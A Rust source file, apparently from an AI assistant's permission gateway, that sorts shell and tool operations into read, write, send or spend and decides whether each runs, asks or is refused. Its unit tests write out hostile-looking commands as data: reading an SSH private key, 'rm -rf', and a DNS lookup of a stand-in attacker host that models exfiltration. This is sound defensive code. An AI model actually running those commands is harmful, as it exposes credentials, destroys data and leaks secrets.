//! What kind of action an operation is, and what the assistant's rules say
//! to do with it. Decided in code from the operation itself: nothing the
//! model, a bot or a document says can change the answer.

use crate::personal::{ActionMode, OperationSpec, PersonalAssistant, PersonalTask, TaskKind, ToolClass};

/// Programs that only look at things. Anything else counts as a change.
const READ_ONLY: &[&str] = &[
    "df", "du", "free", "uptime", "uname", "whoami", "id", "date", "hostname", "ls", "cat", "head", "tail", "wc",
    "stat", "file", "ps", "pgrep", "w", "who", "last", "lsblk", "nproc", "vmstat", "iostat", "ss", "netstat",
    "sort", "uniq", "echo", "which", "grep", "rg", "find", "ping", "dig", "nslookup", "host", "top", "git",
    "systemctl", "journalctl", "docker", "ip", "sensors", "md5sum", "sha256sum", "tree", "true", "test", "[",
];
/// Read-only programs that show a file's contents: pointed outside the
/// assistant's folders, they always ask, whatever the rules say.
const CONTENT_READERS: &[&str] = &["cat", "head", "tail", "grep", "rg", "find", "md5sum", "sha256sum", "wc", "tree", "ls", "stat", "file", "test", "[", "sort", "uniq", "git"];
/// Programs that reach the network, refused in local-only mode.
const NETWORK: &[&str] = &["ping", "dig", "nslookup", "host", "curl", "wget", "ssh", "scp", "rsync", "nc"];

fn program(argv: &[String]) -> &str {
    argv.first().map(|p| p.rsplit('/').next().unwrap_or(p)).unwrap_or("")
}

/// Only positively recognized argument forms can run as reads. Unknown flags
/// need approval: many otherwise read-only tools have output or execution hooks.
fn read_only_use(argv: &[String]) -> bool {
    if argv.first().is_some_and(|p| p.contains('/') || p.contains('\\')) { return false; }
    let args: Vec<&str> = argv.iter().skip(1).map(String::as_str).collect();
    let name = program(argv);
    if name == "git" {
        let Some((sub, rest)) = args.split_first() else { return false };
        // Patch rendering may invoke repository-configured external diff or
        // textconv programs unless both execution paths are disabled explicitly.
        if (matches!(*sub, "diff" | "show") || (*sub == "log" && rest.contains(&"-p")))
            && !(rest.contains(&"--no-ext-diff") && rest.contains(&"--no-textconv")) {
            return false;
        }
        let flags: &[&str] = match *sub {
            "status" => &["--short", "-s", "--branch", "-b", "--porcelain", "--porcelain=v1", "--porcelain=v2"],
            "log" | "show" | "diff" => &["--oneline", "--stat", "--name-only", "--name-status", "--no-patch", "-p", "--cached", "--staged", "--no-ext-diff", "--no-textconv"],
            "branch" => return rest.iter().all(|a| matches!(*a, "--list" | "-l" | "-a" | "--all" | "-r" | "--remotes" | "--show-current" | "-v" | "-vv")),
            "remote" => return rest.iter().all(|a| *a == "-v" || *a == "--verbose"),
            "ls-files" => &["--stage", "-s", "--cached", "--others", "--exclude-standard", "-z"],
            "rev-parse" => &["--show-toplevel", "--git-dir", "--show-prefix", "--abbrev-ref", "--verify", "--short"],
            "describe" => &["--always", "--tags", "--dirty"],
            _ => return false,
        };
        return rest.iter().all(|a| !a.starts_with('-') || *a == "--" || flags.contains(a));
    }
    // uniq's second positional operand is an output file, even without flags.
    if name == "uniq" {
        let mut operands = 0;
        let mut options = true;
        for arg in &args {
            if options && *arg == "--" { options = false; continue; }
            if options && arg.starts_with('-') && *arg != "-" { continue; }
            operands += 1;
        }
        if operands > 1 { return false; }
    }
    let flags: &[&str] = match name {
        "cat" => &["-n", "-b", "-s", "-v", "-e", "-t", "-A"],
        "head" | "tail" => &["-n", "-c", "-q", "-v"],
        "ls" => &["-l", "-a", "-la", "-al", "-h", "-lh", "-lah", "-R", "-d", "-1", "--all", "--long"],
        "rg" | "grep" => &["-n", "-i", "-v", "-l", "-c", "-w", "-F", "-E", "-r", "--files", "--hidden", "--no-ignore", "--line-number", "--fixed-strings"],
        "sort" => &["-n", "-r", "-u", "-f", "-b", "-h", "-V"],
        "uniq" => &["-c", "-d", "-u"],
        "wc" => &["-l", "-w", "-c", "-m", "-L"],
        "find" => &["-name", "-iname", "-path", "-type", "-maxdepth", "-mindepth", "-print", "-print0"],
        "test" | "[" => &["-e", "-f", "-d", "-r", "-s", "-L", "-h", "-n", "-z"],
        "df" | "du" => &["-h", "-k", "-m", "-s", "-a", "--human-readable"],
        "uname" => &["-a", "-s", "-r", "-m"],
        "date" => return args.iter().all(|a| matches!(*a, "-u" | "--utc" | "--iso-8601") || a.starts_with('+')),
        "hostname" => return args.is_empty(),
        "echo" => &["-n"],
        "stat" | "file" | "md5sum" | "sha256sum" | "tree" | "which" => &[],
        "whoami" | "id" | "uptime" | "free" | "nproc" | "true" => return args.is_empty(),
        // Network commands are classified as Send separately.
        "ping" | "dig" | "nslookup" | "host" => return true,
        _ => return false,
    };
    args.iter().all(|a| !a.starts_with('-') || *a == "--" || *a == "-" || flags.contains(a))
}

fn resolved(path: &std::path::Path) -> Option<std::path::PathBuf> {
    use std::path::{Component, PathBuf};
    let mut result = PathBuf::new();
    for component in path.components() {
        match component {
            Component::ParentDir => { result.pop(); }
            Component::CurDir => {},
            other => { result.push(other.as_os_str()); }
        }
        // Resolve each existing prefix before consuming .., matching filesystem semantics.
        if std::fs::symlink_metadata(&result).is_ok() {
            result = std::fs::canonicalize(&result).ok()?;
        }
    }
    result.is_absolute().then_some(result)
}

/// Extract operands without mistaking a search pattern or option value for a file.
fn file_operands(op: &OperationSpec) -> Vec<&str> {
    let name = program(&op.argv);
    let mut pattern = matches!(name, "rg" | "grep") && !op.argv.iter().any(|a| a == "--files");
    let mut value = false;
    let mut options = true;
    let mut paths = Vec::new();
    for arg in op.argv.iter().skip(1).map(String::as_str) {
        if value { value = false; continue; }
        if options && arg == "--" { options = false; continue; }
        if options && arg.starts_with('-') && arg != "-" {
            value = matches!((name, arg), ("head" | "tail", "-n" | "-c") | ("find", "-name" | "-iname" | "-path" | "-type" | "-maxdepth" | "-mindepth"));
            continue;
        }
        if pattern { pattern = false; continue; }
        if name == "[" && arg == "]" { continue; }
        paths.push(arg);
    }
    paths
}

fn inside(path: &str, cwd: &str, folders: &[String]) -> bool {
    if path.starts_with('~') { return false; }
    let path = std::path::Path::new(path);
    let full = if path.is_absolute() { path.to_path_buf() } else { std::path::Path::new(cwd).join(path) };
    let Some(full) = resolved(&full) else { return false };
    folders.iter().filter_map(|f| resolved(std::path::Path::new(f))).any(|folder| full.starts_with(folder))
}

/// The action class of an operation, and whether it reads something
/// private (a file outside the assistant's folders), which always asks.
pub fn classify(op: &OperationSpec, folders: &[String]) -> (ToolClass, bool) {
    match op.tool.as_str() {
        crate::personal_worker::COMMAND_TOOL => {
            let name = program(&op.argv);
            if !READ_ONLY.contains(&name) || !read_only_use(&op.argv) || op.argv.iter().any(|a| a.contains('>')) {
                return (ToolClass::Write, false);
            }
            // Reaching out over the network can carry data away (a name lookup
            // is enough), so it counts as sending.
            if NETWORK.contains(&name) {
                return (ToolClass::Send, false);
            }
            let private = CONTENT_READERS.contains(&name)
                && (!inside(&op.cwd, &op.cwd, folders) || file_operands(op).iter().any(|a| !inside(a, &op.cwd, folders)));
            (ToolClass::Read, private)
        }
        // Opening any address the model picks can carry data to that site.
        "browser.open" => (ToolClass::Send, false),
        tool if tool.starts_with("github.") || tool.starts_with("gmail.") || tool.starts_with("drive.") => {
            if tool.ends_with(".read") || tool.ends_with(".search") || tool.ends_with(".get") || tool.ends_with(".open") { (ToolClass::Read, false) } else { (ToolClass::Send, false) }
        }
        "model.reply" => (ToolClass::Spend, false),
        _ => (ToolClass::Write, false),
    }
}

pub fn uses_network(op: &OperationSpec) -> bool {
    op.tool != crate::personal_worker::COMMAND_TOOL || NETWORK.contains(&program(&op.argv))
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Gate {
    Run(ActionMode),
    Ask,
    HandOff,
    /// Never allowed, whatever the human approves.
    Refuse(&'static str),
}

/// What to do with a task's operation right now. `asked` is the human
/// message that started it, for "only when I say so".
pub fn gate(assistant: &PersonalAssistant, task: &PersonalTask, asked: Option<&str>) -> Gate {
    let Some(op) = &task.operation else { return Gate::Refuse("The task has no operation.") };
    if assistant.privacy.local_only && uses_network(op) {
        return Gate::Refuse("Local-only mode is on, so nothing that uses the network runs.");
    }
    let folders: Vec<String> = if op.host == assistant.host_id {
        assistant.allowed_folders.clone()
    } else {
        assistant.machines.iter().filter(|m| m.host_id == op.host).map(|m| m.folder.clone()).collect()
    };
    let (class, private) = classify(op, &folders);
    // A helper only ever reads (Dot's "research only reads").
    if task.kind == TaskKind::Helper && class != ToolClass::Read {
        return Gate::Refuse("A helper can only read, so it can't do that.");
    }
    let mode = assistant.mode_for(class);
    match mode {
        ActionMode::HandOff => Gate::HandOff,
        ActionMode::Ask => Gate::Ask,
        _ if private => Gate::Ask,
        // Spending without asking needs a bounded budget to stay inside.
        ActionMode::Auto if class == ToolClass::Spend && assistant.budget.daily_limit_micros.is_none() => Gate::Ask,
        ActionMode::Auto => Gate::Run(mode),
        ActionMode::OnRequest => {
            let name = program(&op.argv).to_lowercase();
            let said = asked.is_some_and(|text| text.to_lowercase().split(|c: char| !c.is_alphanumeric() && c != '-' && c != '_').any(|word| !name.is_empty() && word == name));
            if said { Gate::Run(mode) } else { Gate::Ask }
        }
    }
}

/// The decision marker for something a rule (not a person) let through.
pub fn rule_marker(mode: ActionMode) -> String {
    format!("rule:{}", match mode { ActionMode::Auto => "auto", ActionMode::OnRequest => "onRequest", ActionMode::Ask => "ask", ActionMode::HandOff => "handOff" })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn op(argv: &[&str]) -> OperationSpec {
        OperationSpec { tool: crate::personal_worker::COMMAND_TOOL.into(), host: "h".into(), cwd: "/srv/a".into(), argv: argv.iter().map(|s| s.to_string()).collect(), plan: None }
    }

    #[test]
    fn unsafe_read_arguments_require_write_approval() {
        for argv in [vec!["git", "branch", "-f", "saved", "HEAD~1"], vec!["sort", "-oout", "input"], vec!["rg", "--pre", "script", "pattern", "input"], vec!["git", "diff", "--output=out"], vec!["git", "branch", "new-branch"]] {
            assert_eq!(classify(&op(&argv), &[]).0, ToolClass::Write, "{argv:?}");
        }
    }

    #[cfg(unix)]
    #[test]
    fn recursive_grep_cannot_automatically_follow_internal_symlinks() {
        let base = std::env::temp_dir().join(format!("gateway-recursive-{}", std::process::id()));
        let root = base.join("allowed");
        let outside = base.join("outside");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::create_dir_all(&outside).unwrap();
        std::fs::write(outside.join("private"), "scratch-secret").unwrap();
        std::os::unix::fs::symlink(&outside, root.join("linked-dir")).unwrap();
        std::os::unix::fs::symlink(outside.join("private"), root.join("linked-file")).unwrap();
        let folders = vec![root.to_string_lossy().into_owned()];
        let mut operation = op(&["grep", "-R", "scratch-secret", "."]);
        operation.cwd = folders[0].clone();
        let output = std::process::Command::new("grep").args(&operation.argv[1..]).current_dir(&root).output().unwrap();
        assert!(String::from_utf8_lossy(&output.stdout).contains("scratch-secret"));
        assert_eq!(classify(&operation, &folders).0, ToolClass::Write);
        operation.argv[1] = "-r".into();
        let output = std::process::Command::new("grep").args(&operation.argv[1..]).current_dir(&root).output().unwrap();
        assert!(!String::from_utf8_lossy(&output.stdout).contains("scratch-secret"));
        assert_eq!(classify(&operation, &folders), (ToolClass::Read, false));
        std::fs::remove_dir_all(base).unwrap();
    }

    #[test]
    fn automatic_git_patches_disable_external_diff_and_text_conversion() {
        for sub in ["diff", "show"] {
            assert_eq!(classify(&op(&["git", sub]), &[]).0, ToolClass::Write);
            assert_eq!(classify(&op(&["git", sub, "--no-ext-diff", "--no-textconv"]), &[]).0, ToolClass::Read);
        }
        assert_eq!(classify(&op(&["git", "log", "-p"]), &[]).0, ToolClass::Write);
    }

    #[test]
    fn uniq_output_operand_requires_approval() {
        let base = std::env::temp_dir().join(format!("gateway-uniq-{}", std::process::id()));
        std::fs::create_dir_all(&base).unwrap();
        std::fs::write(base.join("input"), "one\none\n").unwrap();
        std::fs::write(base.join("output"), "keep").unwrap();
        let mut operation = op(&["uniq", "input", "output"]);
        operation.cwd = base.to_string_lossy().into_owned();
        let folders = vec![operation.cwd.clone()];
        if classify(&operation, &folders).0 == ToolClass::Read {
            let result = std::process::Command::new("uniq").args(&operation.argv[1..]).current_dir(&base).output().unwrap();
            assert!(result.status.success());
        }
        assert_eq!(std::fs::read_to_string(base.join("output")).unwrap(), "keep");
        operation.argv = vec!["uniq".into(), "-c".into(), "input".into()];
        assert_eq!(classify(&operation, &folders), (ToolClass::Read, false));
        std::fs::remove_dir_all(base).unwrap();
    }

    #[test]
    fn date_setting_and_disguised_executables_are_not_automatic_reads() {
        assert_eq!(classify(&op(&["date", "101512002026"]), &[]).0, ToolClass::Write);
        assert_eq!(classify(&op(&["/tmp/cat", "notes"]), &[]).0, ToolClass::Write);
    }

    #[cfg(unix)]
    #[test]
    fn relative_and_symlink_reads_respect_folder_boundary() {
        let base = std::env::temp_dir().join(format!("gateway-paths-{}", std::process::id()));
        let root = base.join("allowed");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(root.join("local"), "ok").unwrap();
        std::fs::write(base.join("outside"), "private").unwrap();
        std::os::unix::fs::symlink(base.join("outside"), root.join("linked")).unwrap();
        let folders = vec![root.to_string_lossy().into_owned()];
        for (arg, private) in [("local", false), ("../outside", true), ("linked", true)] {
            let mut operation = op(&["cat", arg]);
            operation.cwd = root.to_string_lossy().into_owned();
            assert_eq!(classify(&operation, &folders), (ToolClass::Read, private), "{arg}");
        }
        for argv in [vec!["rg", "nonexistent-pattern", "local"], vec!["head", "-n", "2", "local"], vec!["find", ".", "-name", "*.txt"]] {
            let mut operation = op(&argv);
            operation.cwd = root.to_string_lossy().into_owned();
            assert_eq!(classify(&operation, &folders), (ToolClass::Read, false));
        }
        std::fs::remove_dir_all(base).unwrap();
    }

    #[test]
    fn reads_and_changes_are_told_apart_by_the_command_itself() {
        let folders = vec!["/srv/a".to_string()];
        assert_eq!(classify(&op(&["df", "-h", "/"]), &folders), (ToolClass::Read, false));
        assert_eq!(classify(&op(&["git", "status"]), &folders), (ToolClass::Read, false));
        assert_eq!(classify(&op(&["test", "-e", "test.txt"]), &folders), (ToolClass::Read, false));
        assert_eq!(classify(&op(&["test", "-e", "/home/me/.ssh/id_ed25519"]), &folders), (ToolClass::Read, true));
        assert_eq!(classify(&op(&["git", "push"]), &folders).0, ToolClass::Write);
        assert_eq!(classify(&op(&["rm", "-rf", "x"]), &folders).0, ToolClass::Write);
        assert_eq!(classify(&op(&["find", ".", "-delete"]), &folders).0, ToolClass::Write);
        assert_eq!(classify(&op(&["systemctl", "restart", "nginx"]), &folders).0, ToolClass::Write);
        // Reading a private file is still a read, but it always asks.
        assert_eq!(classify(&op(&["cat", "/home/me/.ssh/id_ed25519"]), &folders), (ToolClass::Read, true));
        assert_eq!(classify(&op(&["cat", "/srv/a/notes.txt"]), &folders), (ToolClass::Read, false));
        assert_eq!(classify(&op(&["cat", "/srv/a/../b/x"]), &folders), (ToolClass::Read, true));
        assert_eq!(classify(&op(&["dig", "secret.attacker.example"]), &folders).0, ToolClass::Send);
        let open = OperationSpec { tool: "browser.open".into(), ..op(&["https://x.example/?d=1"]) };
        assert_eq!(classify(&open, &folders).0, ToolClass::Send);
    }
}
